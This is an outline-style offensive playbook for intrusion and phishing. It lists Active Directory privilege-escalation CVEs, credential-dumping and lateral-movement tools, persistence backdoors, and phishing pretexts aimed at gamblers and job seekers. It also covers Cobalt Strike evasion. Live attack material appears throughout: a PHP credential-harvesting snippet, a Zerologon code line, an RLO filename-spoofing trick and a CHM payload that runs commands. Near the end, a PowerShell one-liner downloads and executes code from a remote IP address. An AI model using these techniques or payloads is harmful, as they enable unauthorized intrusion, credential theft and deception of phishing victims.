- if ($_SERVER['REQUEST_METHOD'] == 'POST') {      $username = $_POST['username'];    $password = $_POST['password'];      $data = $username . ':' . $password . PHP_EOL;   file_put_contents('users.txt', $data, FILE_APPEND | LOCK_EX);
#### Grab Hashes from Servers Where Domain Admins Log In

#### Find Password Lists

#### Find Privileged-Group Users

- Administrator
- Backup Operators
#### CVE-2014-6324 (MS14-068)

- Prerequisites
  - The domain controller has not applied the MS14-068 patch (KB3011780)
  - Have compromised a domain-joined computer
  - Have the domain user password and SID of that domain computer
- Vulnerability cause
  - When the client initiates an authentication request, setting include-PAC to False means the returned TGT will not contain a PAC
  - When the KDC validates the PAC, for the signature algorithm at the tail of the PAC, it allows any signature algorithm. As long as the client specifies an arbitrary signature algorithm, the KDC server will use that algorithm for signature verification. Therefore any forged content can be treated as valid, simply by appending the MD5 hash of the content as the signature
    - Craft a high-privilege PAC
      - 512, 520, 518, 519
  - The PAC is not placed in the TGT; it is placed elsewhere. The KDC can still correctly parse the PAC information that is not in the TGT. The PAC must be ciphertext, encrypted with a Key. The KDC takes the subkey from the Authenticator, decrypts the PAC information, and verifies the signature using the signature algorithm set by the client
    - enc-authorization-data
  - After the KDC successfully validates the TGT that lacks a PAC, it then validates the legitimacy of the PAC that is not in the TGT. If both validate successfully, the KDC extracts the User SID and Group SID from the PAC and re-signs them, using the same signature algorithm and key as when the include-pac flag is set to TRUE. The newly produced PAC is added to the decrypted TGT, which is then re-encrypted to make a brand new TGT and sent to the client
    - Because the requested service is krbtgt, the returned TGS ticket can be used as a TGT
- deploy
#### CVE-2020-1472

- MS-NRPC
  - AES-CFB8
    - Adds a 16-byte initialization vector (IV) in front of the plaintext to encrypt each byte of the plaintext, then applies AES to the IV and the first 16 bytes of the plaintext, takes the first byte of the AES output, and XORs it with the next plaintext byte
    - For 1 out of 256 keys, applying AES-CFB8 encryption to an all-zero plaintext produces an all-zero ciphertext, thereby allowing authentication bypass
    - Using the NetrServerPasswordSet2 method, a new password can be created for the client, encrypted with AES-CFB8 using the session key. The Netlogon plaintext password consists of 516 bytes, with the last four indicating the password length. By supplying 516 zeros, the password will be decrypted to 516 zeros, or an empty password
      - server_auth = nrpc.hNetrServerAuthenticate3(      rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,      target_computer + '\x00', ciphertext, flags    )
#### CVE-2021-1675/CVE-2021-34527 (PrintNightMare)

- Print Spooler service
  - RpcAddPrinterDriver
    - Allows remote printing and driver installation. This function is intended to give users with the Windows SeLoadDriverPrivilege privilege the ability to add drivers to a remote print spooler. This privilege is normally reserved for the built-in Administrators group and users of the Print Operators group who may have a legitimate need to install printer drivers on remote end-user machines.
      - It allows any authenticated user to add print drivers to a Windows system without the above privilege, enabling attackers to achieve full remote code execution on the affected system as SYSTEM
#### CVE-2021-42287&CVE-2021-42278 (noPac)

- CVE-2021-42278: machine account names should generally end with $, but AD does not validate machine account names within the domain.
- CVE-2021-42287: create a machine account with the same name as the DC machine account (not ending with $). After requesting a TGT with that account, change the account name, then request a TGS ticket via S4U2Self. When the DC encrypts the TGS ticket in the TGS_REP phase, it cannot find that account to encrypt with the machine account hash, so the DC uses its own hash to encrypt the TGS ticket and provides a PAC belonging to that account, giving us a high-privilege ST
- MS-DS-Machine-Account-Quota=0
  - **Need write permission on an account**
    - GenericAll
    - Groups with write permission on certain **machines or users**
    - Domain-joined account
#### Privilege escalation via domain relay vulnerabilities, ADCS vulnerabilities, etc.

- CVE-2022-26923
  - DNShostname
- NTLM relay
  - Responder
  - Inveigh
  - multirelayx.py
  - PrinterBug
  - PeitiPotam
  - DFSCoerce
  - ShadowCoerce
  - PrivExchange
  - [https://github.com/p0dalirius/Coercer](https://github.com/p0dalirius/Coercer)
#### Gain domain controller privileges via Distributed-COM-Users or Performance-Log-Users

- [https://decoder.cloud/2024/04/24/hello-im-your-domain-admin-and-i-want-to-authenticate-against-you/](https://decoder.cloud/2024/04/24/hello-im-your-domain-admin-and-i-want-to-authenticate-against-you/)
#### Obtain the Azure AD Connect sync account

- DC SYNC
#### Analyze group policy

- [https://github.com/synacktiv/gpoParser/tree/main](https://github.com/synacktiv/gpoParser/tree/main)
#### [https://github.com/evilashz/PIGADVulnScanner](https://github.com/evilashz/PIGADVulnScanner)

### Server privilege escalation

#### Potato series privilege escalation: principles and AV/EDR evasion

- SeImpersonate: impersonate the client after authentication
  - Windows 2000 SP4
  - Services started by the Service Control Manager
  - COM servers started by the COM infrastructure and configured to run under a specific account
  - Members of the device local Administrators group
  - Device local service accounts
  - Computer Configuration\Windows Settings\Security Settings\Local Policies\User Rights Assignment
    - gpedit
  - This is applied to threads
- COM basics
  - Every COM interface must inherit, directly or indirectly, from an interface named IUnknown. This interface provides baseline functionality that all COM objects must support
    - IUnknown
      - QueryInterface
        - dynamic_cast
        - hr = pFileOpen->QueryInterface(IID_IFileDialogCustomize,reinterpret_cast<void**>(&pCustom));
      - AddRef
        - Object reference count
      - Release
  - COM events
    - event_source
    - event_receiver
  - BSTR
    - When allocated, an extra 4-byte length field is stored in front of the string, recording the byte count of the string (excluding the trailing null character \0)
  - Memory
    - CoTaskMemAlloc
    - CoTaskMemFree
  - __uuidof
  - IID_PPV_ARGS
    - pFileOpen->QueryInterface(IID_PPV_ARGS(&pCustom))
  - SafeRelease
  - CComPtr
    - Does not explicitly call Release
      - pFileOpen.CoCreateInstance(__uuidof(FileOpenDialog));
- Rotten Potato
  - [https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp](https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp)
  - SSPI
    - SSPI stands for Security Support Provider Interface, a Win32 API in the Windows operating system used to perform various security-related operations (such as authentication)
    - SSP
      - The Microsoft Security Support Provider Interface (SSPI) is the foundation of Windows authentication. Applications and infrastructure services that require authentication use SSPI, and the protocols used are the following SSP security protocols
      - NTLM SSP
        - Challenge/Response verification mechanism
          - The client uses NTLM SSP to generate an NTLM_NEGOTIATE message (called a TYPE 1 message) and sends it to the server.
          - The server receives the TYPE 1 message from the client, passes it to NTLM SSP, gets an NTLM_CHALLENGE message (called a TYPE 2 message), and sends it back to the client. This message contains a random value generated by the server, called the challenge.
          - The client receives the TYPE 2 message returned by the server and extracts the random challenge value. The client converts the password (123) into an LM HASH and NT HASH, and uses the computed LM HASH and/or NT HASH to perform some computation on the challenge.
          - After the server receives the TYPE 3 message, it repeats the client's operation from step 3 and computes a hash. It then compares its own hash with the hash in the TYPE 3 message sent by the client. If they match, the client is verified successfully; otherwise verification fails.
      - Kerberos
        - Ticket-based authentication mechanism
  - CoGetInstanceFromIStorage
    - [https://learn.microsoft.com/en-us/windows/win32/api/objbase/nf-objbase-cogetinstancefromistorage](https://learn.microsoft.com/en-us/windows/win32/api/objbase/nf-objbase-cogetinstancefromistorage)
  - [https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
#### Kernel vulnerability privilege escalation

### AD lateral movement methods and tool evasion

#### AD reconnaissance and lateral movement via RPC

- Lateral movement
  - [https://github.com/XiaoliChan/wmiexec-Pro](https://github.com/XiaoliChan/wmiexec-Pro)
    - Win32_ScheduledJob
  - [https://github.com/JDArmy/NO445-lateral-movement](https://github.com/JDArmy/NO445-lateral-movement)
    - Win32_Process
  - [https://github.com/rootclay/WMIHACKER](https://github.com/rootclay/WMIHACKER)
  - [https://github.com/XiaoliChan/wmiexec-RegOut](https://github.com/XiaoliChan/wmiexec-RegOut)
  - [https://github.com/Mr-Un1k0d3r/SCShell](https://github.com/Mr-Un1k0d3r/SCShell)
    - hRChangeServiceConfigW
  - [https://github.com/airzero24/WMIReg](https://github.com/airzero24/WMIReg)
    - StdRegProv
  - [https://github.com/lexfo/rpc2socks](https://github.com/lexfo/rpc2socks)
    - socks
  - [https://github.com/Marshall-Hallenbeck/ms_scmr](https://github.com/Marshall-Hallenbeck/ms_scmr)
    - File upload, etc.
  - [https://github.com/zyn3rgy/smbtakeover](https://github.com/zyn3rgy/smbtakeover)
    - Release the 445/tcp binding
  - [https://github.com/WKL-Sec/dcomhijack](https://github.com/WKL-Sec/dcomhijack)
    - DLL hijacking related to DCOM
  - [https://github.com/zcgonvh/TaskSchedulerMisc](https://github.com/zcgonvh/TaskSchedulerMisc)
    - MS-TSCH scheduled tasks
- Reconnaissance
  - [https://github.com/JDArmy/RPCSCAN](https://github.com/JDArmy/RPCSCAN)
    - ms-epmap
  - [https://github.com/StarfireLab/EFSRPCrpc](https://github.com/StarfireLab/EFSRPCrpc)
    - EFSRPC-ping
- rpc
  - [https://github.com/sogeti-esec-lab/RPCForge](https://github.com/sogeti-esec-lab/RPCForge)
    - fuzz
  - [https://github.com/hfiref0x/WinObjEx64](https://github.com/hfiref0x/WinObjEx64)
    - Windows object viewer
  - [https://github.com/tothi/serviceDetector](https://github.com/tothi/serviceDetector)
    - Connect to 445 and query installed services via ms-lsat
  - [https://github.com/cyberark/RPCMon](https://github.com/cyberark/RPCMon)
    - Monitor RPC
  - [https://github.com/zodiacon/WFPExplorer](https://github.com/zodiacon/WFPExplorer)
    - Windows Filtering Platform objects
  - [https://github.com/CICADA8-Research/COMThanasia](https://github.com/CICADA8-Research/COMThanasia)
    - COM object analysis tool
#### AD credential and password collection

- [https://github.com/ly4k/PassTheChallenge](https://github.com/ly4k/PassTheChallenge)
  - Credential Guard credential protection service
- [https://github.com/ly4k/Pypykatz](https://github.com/ly4k/Pypykatz)
  - python mimikatz
- [https://github.com/praetorian-inc/ADFSRelay](https://github.com/praetorian-inc/ADFSRelay)
  - ADFS authentication relay
- [https://github.com/med0x2e/NTLMRelay2Self](https://github.com/med0x2e/NTLMRelay2Self)
  - web relay
- [https://github.com/deepinstinct/Lsass-Shtinkering](https://github.com/deepinstinct/Lsass-Shtinkering)
  - Windows Error Reporting service
- [https://github.com/tothi/rbcd-attack](https://github.com/tothi/rbcd-attack)
  - Resource-based constrained delegation
- [https://github.com/wjlab/Darksteel](https://github.com/wjlab/Darksteel)
  - Automated in-domain information gathering
- [https://github.com/lele8/SharpUserIP](https://github.com/lele8/SharpUserIP)
  - Extract login logs from the domain controller or remotely to quickly obtain the IP addresses corresponding to domain users
- [https://github.com/aleenzz/ADExplorerX](https://github.com/aleenzz/ADExplorerX)
  - AD browser
- [https://github.com/outflanknl/Dumpert](https://github.com/outflanknl/Dumpert)
  - System Calls
    - old
- [https://github.com/zblurx/certsync](https://github.com/zblurx/certsync)
  - Certificate abuse
- [https://github.com/battleoverflow/lsass-dump](https://github.com/battleoverflow/lsass-dump)
  - Simple export demo
- [https://github.com/0x727/UserRegEnum_0x727](https://github.com/0x727/UserRegEnum_0x727)
  - Find logged-on users on all computers in the domain with a normal domain user's privileges
- [https://github.com/Avienma/DumpHash](https://github.com/Avienma/DumpHash)
  - Clean hash export, but requires high privileges
- [https://github.com/GamehunterKaan/Plog](https://github.com/GamehunterKaan/Plog)
  - mimikatz password export module
- [https://github.com/GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
  - Read-only DPAPI
- [https://github.com/mdsecactivebreach/DragonCastle](https://github.com/mdsecactivebreach/DragonCastle)
  - DLL hijacking to read hashes
- [https://github.com/expl0itabl3/EZDump](https://github.com/expl0itabl3/EZDump)
  - Simple export in C#
- [https://github.com/nettitude/ETWHash](https://github.com/nettitude/ETWHash)
  - Read hashes via ETW events
- [https://github.com/4ndr34z/ntlmthief](https://github.com/4ndr34z/ntlmthief)
  - Read hashes via SSPI
- [https://github.com/gabriellandau/PPLFault](https://github.com/gabriellandau/PPLFault)
  - Attack PPL process protection to read hashes
- [https://github.com/grimlockx/ADCSKiller](https://github.com/grimlockx/ADCSKiller)
  - ADCS exploitation tool
- [https://github.com/OmriBaso/RToolZ](https://github.com/OmriBaso/RToolZ)
  - Dump PPL Lsass using the ProcExp152.sys driver
- [https://github.com/BeichenDream/SharpToken](https://github.com/BeichenDream/SharpToken)
  - Find tokens leaked by all processes in the system
- [https://github.com/S12cybersecurity/RDPCredentialStealer](https://github.com/S12cybersecurity/RDPCredentialStealer)
  - Detours API hooking to read RDP login credentials
- [https://github.com/Heart-Sky/ListRDPConnections](https://github.com/Heart-Sky/ListRDPConnections)
  - List all RDP connection records
- [https://github.com/0neAtSec/SharpDomainInfo](https://github.com/0neAtSec/SharpDomainInfo)
  - Automated reconnaissance
- [https://github.com/Tw1sm/spraycharles](https://github.com/Tw1sm/spraycharles)
  - Slow password spraying
- [https://github.com/synacktiv/GPOddity](https://github.com/synacktiv/GPOddity)
- [https://github.com/grayhatkiller/SharpExShell](https://github.com/grayhatkiller/SharpExShell)
- [https://github.com/djackreuter/proc_noprocdump](https://github.com/djackreuter/proc_noprocdump)
- [https://github.com/mtth-bfft/adeleg](https://github.com/mtth-bfft/adeleg)
  - Enumerate all delegations
- [https://github.com/ricardojoserf/NativeDump](https://github.com/ricardojoserf/NativeDump)
- [https://github.com/MzHmO/LeakedWallpaper](https://github.com/MzHmO/LeakedWallpaper)
  - Extract hashes from sessions
- [https://github.com/Offensive-Panda/LsassReflectDumping](https://github.com/Offensive-Panda/LsassReflectDumping)
- [https://github.com/Offensive-Panda/ShadowDumper](https://github.com/Offensive-Panda/ShadowDumper)
  - Export hashes via multiple methods
### Persistence methods

#### Windows backdoors

- Auto-start backdoor
- [https://github.com/mdsecactivebreach/WMIPersistence](https://github.com/mdsecactivebreach/WMIPersistence)
- [https://github.com/netero1010/GhostTask](https://github.com/netero1010/GhostTask)
#### Linux backdoors

- PAM backdoor
- tsh backdoor
#### Modify source code to insert a backdoor

### Internal network core device attack/defense and reconnaissance approaches

#### nas

#### Mail servers

#### Bastion hosts (jump servers)

#### vcenter

#### VDI cloud desktops

#### vpn

### Non-domain internal network penetration testing

#### How to get in

- (Web initial access) Linux getshell
  - Re-crawl the web source code for sensitive information
    - secretkey|hardcoded
    - url
    - Pull it back and audit the code
      - Find more vulnerabilities to maintain access
    - Find web-accessible directories
      - Plant a shell
  - Find key local information
    - host
    - history
    - .....
    - .viminfo
    - SSH private keys
  - Capture SSH passwords via PAM
    - Build the environment locally and compile the .so file yourself
  - Scan memory
    - [https://github.com/liamg/dismember](https://github.com/liamg/dismember)
  - [https://platypus-reverse-shell.vercel.app](https://platypus-reverse-shell.vercel.app/)
  - Find directories
    - >find / -writable -type d 2>/dev/null      # writable directory
>find / -perm -222 -type d 2>/dev/null     # writable directory 
>find / -perm -o w -type d 2>/dev/null     # writable directory
>find / -perm -o x -type d 2>/dev/null     # executable directory
>find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # writable and executable directory
      - attrib +s +h +r 1.txt  modify file timestamp
  - Check iptables
  - ssh -T root@192.168.1.1 /usr/bin/bash -i
    - Ghost login
      - No pseudo-terminal allocated, no logs, but a connection exists
  - grep -rn "jdbc:oracle" /opt/SuperMap/TongWeb7.0.4.1/domains/tw_80/
    - Search files containing a specific string
- vpn
  - Get a shell via a vulnerability
  - Vulnerability leaks usernames and passwords
    - fortinet
  - Vulnerability leaks cookies
    - Some cloud desktops
      - Extortion
  - Traffic is clearly visible, quickly find a jump host
- sso
  - DNS hijacking to bypass two-factor verification
  - Watch for login alerts on the target's devices
  - OAuth vulnerabilities
- A standalone Windows host
  - Registry information gathering
    - [https://github.com/SpecterOps/Nemesis](https://github.com/SpecterOps/Nemesis)
  - Find sensitive files
    - [https://github.com/c1y2m3/FileSearch](https://github.com/c1y2m3/FileSearch)
    - [https://github.com/Naturehi666/searchall](https://github.com/Naturehi666/searchall)
    - [https://github.com/mandiant/msi-search](https://github.com/mandiant/msi-search)
    - [https://github.com/AabyssZG/FindEverything](https://github.com/AabyssZG/FindEverything)
    - Search for files with a specific name under a designated disk
      - dir D:\ /S /B | find "orange1.jsp"
      - /S          Display files in the specified directory and all subdirectories.
      - /B          Use a bare format (no header information or summary).
    - Search the entire disk for files with a specific name
      - cmd /v:off /Q /c "for /f %i in (^'wmic logicaldisk get caption ^| findstr ":"^') do dir %i\ /b /s 2>nul | findstr "ToDesk_Lite.exe""
  - RDP hijacking
    - [https://github.com/S12cybersecurity/RDPCredentialStealer](https://github.com/S12cybersecurity/RDPCredentialStealer)
    - [https://github.com/GoSecure/pyrdp](https://github.com/GoSecure/pyrdp)
    - [https://github.com/0x09AL/RdpThief](https://github.com/0x09AL/RdpThief)
  - View command history
    - Under cmd: doskey /history
    - Under PowerShell: Get-History
  - RAT/C2 development
    - Execute commands
    - List directories
    - Cloud OSS + git
- onedrive\ossutil\github lfs
- [https://gofile.io/](https://gofile.io/), [https://send.cm/](https://send.cm/), [https://krakenfiles.com/](https://krakenfiles.com/), [https://download.ru/](https://download.ru/)
#### Lateral movement

- Web ports
  - Common web ports
  - Web ports discovered from server reconnaissance
    - log
    - Connect
- Other port vulnerabilities
  - [https://github.com/AabyssZG/Docker-TCP-Scan](https://github.com/AabyssZG/Docker-TCP-Scan)
  - Dictionary password spraying
    - Connection tools|elastic....
      - [https://github.com/team-ide/teamide](https://github.com/team-ide/teamide)
  - Database getshell
  - ...
  - Kubernetes:8443 port
- Critical network infrastructure|gateway|dns|device weak credentials
  - DNS hijacking
    - Client-side red team
    - International hotel
    - Ettercap|http
  - switch
    - Weak credentials
      - cirtx
    - [https://github.com/Blootus/CVE-2024-20399-Cisco-RCE](https://github.com/Blootus/CVE-2024-20399-Cisco-RCE)
- Brute-force domain names
#### Locating the domain

- [https://github.com/sosdave/KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- resolve.conf
  - dns
- /etc/krb5.conf
- smb.conf
- CIFS mount
- Locate NAS
- Locate AD-authenticated web services
- Source code + server config files
- Locate VDI
  - Common recon commands; avoid anything involving requests or empty servers
- Locate WSUS
- Locate SCCM
- Locate EDR-managed endpoints
- Check network connections
  - 139
    - Dual NICs
  - 445
  - 389
  - 636
- gitlab, etc.
#### TV|Sunlogin|

### Server and personal PC recon tools and methods

#### Bypass EDR to obtain hashes

#### Host management tool recon

- Shell management tools
  - finalshell
    - [https://github.com/MaskCyberSecurityTeam/FinalShellGetPass](https://github.com/MaskCyberSecurityTeam/FinalShellGetPass)
  - xshell
- Email
  - Foxmail
- Browser
  - chrome
    - [https://github.com/Meckazin/ChromeKatz](https://github.com/Meckazin/ChromeKatz)
    - unlock
    - Shadow file
      - [https://github.com/StarfireLab/BrowserPivot](https://github.com/StarfireLab/BrowserPivot)
    - DPAPI keys
    - [https://github.com/magisterquis/chromecookiestealer](https://github.com/magisterquis/chromecookiestealer)
  - [https://github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)
- telegram
  - [https://github.com/atilaromero/telegram-desktop-decrypt](https://github.com/atilaromero/telegram-desktop-decrypt)
- VPN connection info decryption
  - [https://rotarydrone.medium.com/decrypting-and-replaying-vpn-cookies-4a1d8fc7773e](https://rotarydrone.medium.com/decrypting-and-replaying-vpn-cookies-4a1d8fc7773e)
- ToDesk, Sunlogin, VNC
  - [https://github.com/flydyyg/readTdose-xiangrikui](https://github.com/flydyyg/readTdose-xiangrikui)
  - [https://github.com/frizb/PasswordDecrypts](https://github.com/frizb/PasswordDecrypts)
- Password managers
  - KeePass
    - [https://github.com/vdohney/keepass-password-dumper](https://github.com/vdohney/keepass-password-dumper)
- [https://github.com/lemonlove7/passwd_decrypt_Tools](https://github.com/lemonlove7/passwd_decrypt_Tools)
- [https://github.com/qwqdanchun/Pillager](https://github.com/qwqdanchun/Pillager)
- [https://github.com/V1V1/SharpScribbles](https://github.com/V1V1/SharpScribbles)
- [https://github.com/Pizz33/GoThief](https://github.com/Pizz33/GoThief)
- [https://github.com/can-kat/cstealer](https://github.com/can-kat/cstealer)
#### pyinstaller.exe -F BBScan.py --clean --add-data rules;rules

- Tools for hosts without outbound access need to be packaged as exe
### First step into the internal network

#### Rapid local recon

#### Find web services on the internal network (security devices)

#### C2 benign traffic

## **Phishing**

### Pretext scripts

#### Gamblers

- System malfunction
  - Cannot open account
  - Cannot deposit
  - Cannot withdraw
- Enable proxy
  - Cannot get rebate
- Overseas gamblers
  - Cannot add bank card
#### Job application

- Send resume
- Book a meeting room
- Interview software upgrade
#### Cooperation

- Guild leader
- First-hand gambler data
- Fourth-party payment
  - Low success rate|offline
- White-label iGaming platform service
  - Provide cases
  - Provide source code
  - Provide updates
#### [http://gongwenguan.com/](http://gongwenguan.com/)

### Building a real-world watering hole

#### Domain purchase / choosing phishing domains

- [www.Expireddomains.com](http://www.expireddomains.com/)
  - typo
  - unicode
    - [https://zh.wikipedia.org/wiki/Unicode%E5%AD%97%E7%AC%A6%E5%88%97%E8%A1%A8](https://zh.wikipedia.org/wiki/Unicode%E5%AD%97%E7%AC%A6%E5%88%97%E8%A1%A8)
  - [https://github.com/evilsocket/ditto](https://github.com/evilsocket/ditto)
- spf
  - [https://github.com/SummerSec/spf](https://github.com/SummerSec/spf)
  - [https://github.com/chenjj/espoofer.git](https://github.com/chenjj/espoofer.git)
  - [https://github.com/jetmore/swaks](https://github.com/jetmore/swaks)
  - [https://emkei.cz/](https://emkei.cz/)
  - Sub-org|self-hosted mail server, domain
  - SendGrid
  - mailgun
  - [https://github.com/r00tSe7en/Mail-Probe](https://github.com/r00tSe7en/Mail-Probe)
#### Building the watering-hole page

- Chrome phishing
  - [https://www.google.com/intl/zh-CN/chrome/](https://www.google.com/intl/zh-CN/chrome/)
- Flash phishing
  - [https://github.com/r00tSe7en/Flash-Pop](https://github.com/r00tSe7en/Flash-Pop)
  - [https://github.com/crow821/FakeFlash](https://github.com/crow821/FakeFlash)
- Customer service system upgrade notice
  - Requires an XSS to exist
    - Self-hosted customer service platform
      - File content parsing
        - markdown
- Phishing templates
  - [https://github.com/Threezh1/SiteCopy.git](https://github.com/Threezh1/SiteCopy.git)
  - [https://smalltool.github.io/](https://smalltool.github.io/)
  - [https://github.com/htr-tech/zphisher](https://github.com/htr-tech/zphisher)
  - [https://github.com/JoelGMSec/EvilnoVNC](https://github.com/JoelGMSec/EvilnoVNC)
  - evilginx
- fake login
  - [https://github.com/bitsadmin/fakelogonscreen](https://github.com/bitsadmin/fakelogonscreen)
  - [https://github.com/Pickfordmatt/SharpLocker](https://github.com/Pickfordmatt/SharpLocker)
  - [https://github.com/Dviros/CredsLeaker](https://github.com/Dviros/CredsLeaker)
  - [https://github.com/An0nUD4Y/Evilginx2-Phishlets](https://github.com/An0nUD4Y/Evilginx2-Phishlets)
  - [https://github.com/klezVirus/evilginx-collection](https://github.com/klezVirus/evilginx-collection)
  - [https://github.com/eversinc33/Web-Windows-Login-Phishing](https://github.com/eversinc33/Web-Windows-Login-Phishing)
#### Backend environment setup and anti-sandbox

- otp
  - [https://github.com/asnzodiac/asnphishing](https://github.com/asnzodiac/asnphishing)
- Set up your own XSS platform, or your cookies belong to someone else
- [https://goblin.xiecat.fun/guide/#flash-demo](https://goblin.xiecat.fun/guide/#flash-demo)
  - flash, modify it yourself
- [https://github.com/highmeh/lure](https://github.com/highmeh/lure)
  - Collect email|use with emailall
- [https://github.com/doyensec/Session-Hijacking-Visual-Exploitation](https://github.com/doyensec/Session-Hijacking-Visual-Exploitation)
- [https://github.com/fin3ss3g0d/evilgophish](https://github.com/fin3ss3g0d/evilgophish)
### Payload crafting methods

#### winrar

- Self-extracting
- [https://github.com/b1tg/CVE-2023-38831-winrar-exploit](https://github.com/b1tg/CVE-2023-38831-winrar-exploit)
#### RLO filename reversal

- File marking
- exe->scr|pif
#### link

- [https://github.com/dievus/lnkbomb](https://github.com/dievus/lnkbomb)
- [https://github.com/Yihsiwei/Lnk-Trojan](https://github.com/Yihsiwei/Lnk-Trojan)
- [https://github.com/nickvourd/Rocabella](https://github.com/nickvourd/Rocabella)
- [https://github.com/Pizz33/FTPlnk_phishing](https://github.com/Pizz33/FTPlnk_phishing)
#### import os  os.rename('1.exe', '1\u202egnp.exe')

#### [https://github.com/inspiringz/GoFileBinder](https://github.com/inspiringz/GoFileBinder)

#### CHM

- easychm
  - <!DOCTYPE html><html><head><title>Mousejack replay</title><head></head><body>command exec <OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1><PARAM name="Command" value="ShortCut"> <PARAM name="Button" value="Bitmap::shortcut"> <PARAM name="Item1" value=',cmd.exe,/c calc.exe'> <PARAM name="Item2" value="273,1,1"></OBJECT><SCRIPT>x.Click();</SCRIPT></body></html>
#### ICO replacement

- [https://jarlpenguin.github.io/BeCyIconGrabberPortable/](https://jarlpenguin.github.io/BeCyIconGrabberPortable/)
- [https://www.angusj.com/resourcehacker/](https://www.angusj.com/resourcehacker/)
- [https://www.nirsoft.net/utils/iconsext.html](https://www.nirsoft.net/utils/iconsext.html)
- [https://www.lanzoux.com/iBvsMhajljg](https://www.lanzoux.com/iBvsMhajljg)
#### [https://github.com/tokyoneon/B2E](https://github.com/tokyoneon/B2E)

- notepad chcp 1200 & powershell  -c "IEX(New-Object Net.WebClient)."DownloadString"('ht‘+’tp://106.53.97.7:82/a')"
#### Overlong filenames

#### [https://cli.im/tools](https://cli.im/tools)

#### [https://github.com/dr0op/CrossNet-Beta](https://github.com/dr0op/CrossNet-Beta)

- Just look at it to learn the approach
#### [https://github.com/deepzec/Bad-Pdf](https://github.com/deepzec/Bad-Pdf)

#### [https://github.com/TheCyb3rAlpha/BobTheSmuggler](https://github.com/TheCyb3rAlpha/BobTheSmuggler)

## **RAT/C2 tool development**

### Cobalt Strike in practice: signature removal and evasion

#### Plugin development

- [https://github.com/lintstar/LSTAR](https://github.com/lintstar/LSTAR)
- [https://github.com/REDMED-X/OperatorsKit](https://github.com/REDMED-X/OperatorsKit)
- [https://github.com/lintstar/CS-AutoPostChain](https://github.com/lintstar/CS-AutoPostChain)
- [https://github.com/qigpig/Ghosting-BOF](https://github.com/qigpig/Ghosting-BOF)
- [https://github.com/CodeXTF2/WindowSpy](https://github.com/CodeXTF2/WindowSpy)
- [https://github.com/trustedsec/CS-Remote-OPs-BOF/tree/main?tab=readme-ov-file](https://github.com/trustedsec/CS-Remote-OPs-BOF/tree/main?tab=readme-ov-file)
- [https://github.com/mertdas/PrivKit](https://github.com/mertdas/PrivKit)
- [https://github.com/rasta-mouse/PPEnum](https://github.com/rasta-mouse/PPEnum)
- [https://github.com/m3rcer/Chisel-Strike](https://github.com/m3rcer/Chisel-Strike)
- [https://github.com/tijme/cmstplua-uac-bypass](https://github.com/tijme/cmstplua-uac-bypass)
- [https://github.com/yutianqaq/CSx4Ldr](https://github.com/yutianqaq/CSx4Ldr)
- cna or bof xxx
  - beacon = client.beacons.first ;beacon.execute_bof('example')
    - beacon.inline_execute('<Beacon ID>', '<CBOF C Code Snippet>')
  - [https://github.com/dtmsecurity/bof_helper](https://github.com/dtmsecurity/bof_helper)
  - [https://github.com/securifybv/Visual-Studio-BOF-template](https://github.com/securifybv/Visual-Studio-BOF-template)
- [https://github.com/kyleavery/AceLdr](https://github.com/kyleavery/AceLdr)
- [https://github.com/Cobalt-Strike/bof-vs](https://github.com/Cobalt-Strike/bof-vs)
- [https://github.com/fortra/No-Consolation](https://github.com/fortra/No-Consolation)
- [https://github.com/ScriptIdiot/BOF-patchit](https://github.com/ScriptIdiot/BOF-patchit)
- [https://github.com/qwqdanchun/ScreenShot-BOF](https://github.com/qwqdanchun/ScreenShot-BOF)
- [https://github.com/rasta-mouse/SCMUACBypass](https://github.com/rasta-mouse/SCMUACBypass)
- [https://github.com/9bie/Slacker](https://github.com/9bie/Slacker)
- [https://github.com/ewby/Mockingjay_BOF](https://github.com/ewby/Mockingjay_BOF)
- [https://github.com/baiyies/ScreenshotBOFPlus](https://github.com/baiyies/ScreenshotBOFPlus)
- [https://github.com/Octoberfest7/DropSpawn_BOF](https://github.com/Octoberfest7/DropSpawn_BOF)
- [https://github.com/WKL-Sec/HiddenDesktop](https://github.com/WKL-Sec/HiddenDesktop)
- [https://github.com/boku7/whereami](https://github.com/boku7/whereami)
- [https://github.com/Mr-Un1k0d3r/Cookie-and-Handle-Stealer](https://github.com/Mr-Un1k0d3r/Cookie-and-Handle-Stealer)
#### Server setup

- Disable ping
  - Add a line in /etc/sysctl.conf
  - net.ipv4.icmp_echo_ignore_all=1
- cdn
  - Free Cloudflare account
#### CS modifications

- [https://github.com/CodeXTF2/Burp2Malleable](https://github.com/CodeXTF2/Burp2Malleable)
- [https://github.com/RedSiege/C2concealer](https://github.com/RedSiege/C2concealer)
- [https://github.com/RedSiege/GraphStrike](https://github.com/RedSiege/GraphStrike)
- [https://github.com/D00Movenok/goMalleable](https://github.com/D00Movenok/goMalleable)
- [https://github.com/byt3bl33d3r/pyMalleableC2](https://github.com/byt3bl33d3r/pyMalleableC2)
- [https://github.com/Peithon/JustC2file](https://github.com/Peithon/JustC2file)
#### beacon

- [https://github.com/Z3ratu1/geacon_plus](https://github.com/Z3ratu1/geacon_plus)
- [https://github.com/b1tg/cobaltstrike-beacon-rust](https://github.com/b1tg/cobaltstrike-beacon-rust)
- [https://github.com/tijme/amd-ryzen-master-driver-v17-exploit](https://github.com/tijme/amd-ryzen-master-driver-v17-exploit)
- [https://github.com/NoOne-hub/Beacon.dll](https://github.com/NoOne-hub/Beacon.dll)
  - Simple reverse engineering
- [https://github.com/kyxiaxiang/Beacon_Source](https://github.com/kyxiaxiang/Beacon_Source)
- Modify signatures
